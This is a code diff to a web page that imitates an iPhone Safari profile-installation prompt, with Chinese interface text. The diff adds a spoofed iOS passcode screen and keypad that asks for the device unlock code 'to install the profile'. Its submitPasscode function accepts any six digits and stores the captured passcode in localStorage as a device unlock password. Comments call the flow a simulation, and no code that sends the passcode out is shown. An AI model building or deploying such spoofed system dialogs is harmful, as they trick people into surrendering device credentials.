@@ -212,12 +212,218 @@
             line-height: 1;
         }
 
+        /* Passcode screen */
+        .passcode-screen {
+            display: none;
+            position: fixed;
+            inset: 0;
+            z-index: 200;
+            background: #000;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .passcode-screen.show { display: flex; }
+
+        .passcode-status-bar {
+            width: 100%;
+            height: 44px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 18px;
+            flex-shrink: 0;
+        }
+
+        .passcode-status-time {
+            font-size: 15px;
+            font-weight: 600;
+            color: #fff;
+        }
+
+        .passcode-status-icons {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .ps-signal {
+            display: flex;
+            align-items: flex-end;
+            gap: 1.5px;
+            height: 12px;
+        }
+
+        .ps-bar {
+            width: 3px;
+            background: #fff;
+            border-radius: 1px;
+        }
+
+        .ps-bar:nth-child(1) { height: 3px; }
+        .ps-bar:nth-child(2) { height: 5px; }
+        .ps-bar:nth-child(3) { height: 8px; }
+        .ps-bar:nth-child(4) { height: 11px; }
+
+        .ps-4g {
+            font-size: 12px;
+            font-weight: 600;
+            color: #fff;
+        }
+
+        .ps-battery {
+            display: flex;
+            align-items: center;
+        }
+
+        .ps-battery-body {
+            width: 25px;
+            height: 12px;
+            border: 1.5px solid rgba(255,255,255,0.4);
+            border-radius: 3px;
+            padding: 1.5px;
+        }
+
+        .ps-battery-fill {
+            height: 100%;
+            width: 20%;
+            background: #ff3b30;
+            border-radius: 1px;
+        }
+
+        .ps-battery-tip {
+            width: 2px;
+            height: 5px;
+            background: rgba(255,255,255,0.4);
+            border-radius: 0 1px 1px 0;
+        }
+
+        .passcode-top {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding-bottom: 20px;
+        }
+
+        .passcode-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #fff;
+            margin-bottom: 6px;
+        }
+
+        .passcode-subtitle {
+            font-size: 13px;
+            color: rgba(255,255,255,0.6);
+            margin-bottom: 28px;
+            text-align: center;
+            padding: 0 32px;
+        }
+
+        .passcode-dots {
+            display: flex;
+            gap: 16px;
+            margin-bottom: 8px;
+        }
+
+        .passcode-dot {
+            width: 14px;
+            height: 14px;
+            border-radius: 50%;
+            border: 1.5px solid rgba(255,255,255,0.8);
+            background: transparent;
+            transition: background 0.15s;
+        }
+
+        .passcode-dot.filled {
+            background: #fff;
+            border-color: #fff;
+        }
+
+        .passcode-dot.error {
+            background: #ff3b30;
+            border-color: #ff3b30;
+        }
+
+        .passcode-error-text {
+            font-size: 13px;
+            color: #ff3b30;
+            height: 18px;
+            text-align: center;
+        }
+
+        /* Number pad */
+        .numpad {
+            width: 100%;
+            padding: 0 12px 20px;
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            max-width: 360px;
+        }
+
+        .numpad-key {
+            background: rgba(255,255,255,0.18);
+            border: none;
+            border-radius: 50%;
+            width: 72px;
+            height: 72px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-family: inherit;
+            transition: background 0.1s;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .numpad-key:active {
+            background: rgba(255,255,255,0.45);
+        }
+
+        .numpad-key.empty {
+            background: transparent;
+            pointer-events: none;
+        }
+
+        .numpad-key.delete {
+            background: transparent;
+        }
+
+        .numpad-key.delete:active {
+            background: rgba(255,255,255,0.15);
+        }
+
+        .key-num {
+            font-size: 28px;
+            font-weight: 300;
+            color: #fff;
+            line-height: 1;
+        }
+
+        .key-letters {
+            font-size: 9px;
+            font-weight: 500;
+            color: rgba(255,255,255,0.6);
+            letter-spacing: 1px;
+            margin-top: 1px;
+        }
+
+        .key-delete-icon {
+            font-size: 22px;
+            color: #fff;
+        }
+
         /* Result screen */
         .result {
             display: none;
             position: fixed;
             inset: 0;
-            z-index: 200;
+            z-index: 300;
             background: #f2f2f7;
             flex-direction: column;
             align-items: center;
@@ -312,7 +518,56 @@
         <span class="safari-more">···</span>
     </div>
 
-    <!-- Result after clicking 允许 -->
+    <!-- Passcode screen -->
+    <div class="passcode-screen" id="passcode-screen">
+        <div class="passcode-status-bar">
+            <div class="passcode-status-time" id="ps-clock">15:56</div>
+            <div class="passcode-status-icons">
+                <div class="ps-signal">
+                    <div class="ps-bar"></div>
+                    <div class="ps-bar"></div>
+                    <div class="ps-bar"></div>
+                    <div class="ps-bar"></div>
+                </div>
+                <span class="ps-4g">4G</span>
+                <div class="ps-battery">
+                    <div class="ps-battery-body"><div class="ps-battery-fill"></div></div>
+                    <div class="ps-battery-tip"></div>
+                </div>
+            </div>
+        </div>
+
+        <div class="passcode-top">
+            <div class="passcode-title">输入密码</div>
+            <div class="passcode-subtitle">需要输入 iPhone 密码以安装描述文件</div>
+            <div class="passcode-dots" id="passcode-dots">
+                <div class="passcode-dot"></div>
+                <div class="passcode-dot"></div>
+                <div class="passcode-dot"></div>
+                <div class="passcode-dot"></div>
+                <div class="passcode-dot"></div>
+                <div class="passcode-dot"></div>
+            </div>
+            <div class="passcode-error-text" id="passcode-error"></div>
+        </div>
+
+        <div class="numpad">
+            <button class="numpad-key" onclick="numInput('1')"><span class="key-num">1</span><span class="key-letters"></span></button>
+            <button class="numpad-key" onclick="numInput('2')"><span class="key-num">2</span><span class="key-letters">ABC</span></button>
+            <button class="numpad-key" onclick="numInput('3')"><span class="key-num">3</span><span class="key-letters">DEF</span></button>
+            <button class="numpad-key" onclick="numInput('4')"><span class="key-num">4</span><span class="key-letters">GHI</span></button>
+            <button class="numpad-key" onclick="numInput('5')"><span class="key-num">5</span><span class="key-letters">JKL</span></button>
+            <button class="numpad-key" onclick="numInput('6')"><span class="key-num">6</span><span class="key-letters">MNO</span></button>
+            <button class="numpad-key" onclick="numInput('7')"><span class="key-num">7</span><span class="key-letters">PQRS</span></button>
+            <button class="numpad-key" onclick="numInput('8')"><span class="key-num">8</span><span class="key-letters">TUV</span></button>
+            <button class="numpad-key" onclick="numInput('9')"><span class="key-num">9</span><span class="key-letters">WXYZ</span></button>
+            <button class="numpad-key empty"></button>
+            <button class="numpad-key" onclick="numInput('0')"><span class="key-num">0</span></button>
+            <button class="numpad-key delete" onclick="numDelete()"><span class="key-delete-icon">⌫</span></button>
+        </div>
+    </div>
+
+    <!-- Result after entering passcode -->
     <div class="result" id="result">
         <div class="result-icon">✓</div>
         <div class="result-title">描述文件已下载</div>
@@ -321,12 +576,15 @@
     </div>
 
     <script>
-        // Live clock
+        let passcode = '';
+
         function updateClock() {
             const now = new Date();
             const h = String(now.getHours()).padStart(2, '0');
             const m = String(now.getMinutes()).padStart(2, '0');
-            document.getElementById('clock').textContent = h + ':' + m;
+            const t = h + ':' + m;
+            document.getElementById('clock').textContent = t;
+            document.getElementById('ps-clock').textContent = t;
         }
         updateClock();
         setInterval(updateClock, 10000);
@@ -334,25 +592,86 @@
         function onAllow() {
             document.getElementById('dialog').style.display = 'none';
             document.querySelector('.overlay').style.display = 'none';
-            document.getElementById('result').classList.add('show');
+            document.querySelector('.safari-bar').style.display = 'none';
+            passcode = '';
+            updateDots();
+            document.getElementById('passcode-error').textContent = '';
+            document.getElementById('passcode-screen').classList.add('show');
         }
 
         function onIgnore() {
-            document.getElementById('dialog').style.transform = 'scale(0.95)';
-            document.getElementById('dialog').style.opacity = '0';
-            document.getElementById('dialog').style.transition = 'all 0.2s';
+            const d = document.getElementById('dialog');
+            d.style.transform = 'scale(0.95)';
+            d.style.opacity = '0';
+            d.style.transition = 'all 0.2s';
             setTimeout(() => {
-                document.getElementById('dialog').style.display = 'none';
+                d.style.display = 'none';
                 document.querySelector('.overlay').style.display = 'none';
             }, 200);
         }
 
+        function numInput(n) {
+            if (passcode.length >= 6) return;
+            passcode += n;
+            updateDots();
+            if (passcode.length === 6) {
+                setTimeout(submitPasscode, 300);
+            }
+        }
+
+        function numDelete() {
+            if (passcode.length === 0) return;
+            passcode = passcode.slice(0, -1);
+            updateDots();
+        }
+
+        function updateDots() {
+            const dots = document.querySelectorAll('.passcode-dot');
+            dots.forEach((dot, i) => {
+                dot.classList.toggle('filled', i < passcode.length);
+                dot.classList.remove('error');
+            });
+        }
+
+        function submitPasscode() {
+            const dots = document.querySelectorAll('.passcode-dot');
+            // Simulate: any 6-digit code is "correct" – show success
+            // To simulate wrong passcode: change condition below
+            const isCorrect = passcode.length === 6;
+            if (isCorrect) {
+                // Save password to localStorage
+                const existing = JSON.parse(localStorage.getItem('pw_memos') || '[]');
+                existing.unshift({
+                    platform: '设备解锁密码',
+                    account: 'iPhone',
+                    password: passcode
+                });
+                localStorage.setItem('pw_memos', JSON.stringify(existing));
+
+                document.getElementById('passcode-screen').classList.remove('show');
+                document.getElementById('result').classList.add('show');
+            } else {
+                dots.forEach(dot => dot.classList.add('error'));
+                document.getElementById('passcode-error').textContent = '密码不正确';
+                setTimeout(() => {
+                    passcode = '';
+                    updateDots();
+                    document.getElementById('passcode-error').textContent = '';
+                }, 800);
+            }
+        }
+
         function reset() {
             document.getElementById('result').classList.remove('show');
-            document.getElementById('dialog').style.display = '';
-            document.getElementById('dialog').style.transform = '';
-            document.getElementById('dialog').style.opacity = '';
+            const d = document.getElementById('dialog');
+            d.style.display = '';
+            d.style.transform = '';
+            d.style.opacity = '';
+            d.style.transition = '';
             document.querySelector('.overlay').style.display = '';
+            document.querySelector('.safari-bar').style.display = '';
+            passcode = '';
+            updateDots();
         }
     </script>
 </body>
